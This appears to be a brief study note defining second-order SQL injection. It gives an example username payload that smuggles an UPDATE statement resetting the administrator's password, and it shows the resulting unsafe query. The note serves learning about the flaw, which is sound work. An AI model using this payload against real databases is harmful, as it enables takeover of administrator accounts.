# Second-order SQLi

Stores input for future use, later when handling HTTP requests it gets the data and puts it in a SQL query in an unsafe way

`badguy' ;update users set password='letmein' where user='administrator' --`

`select * from user_options where user='badguy' ;update users set password='letmein' where user='administrator' --`
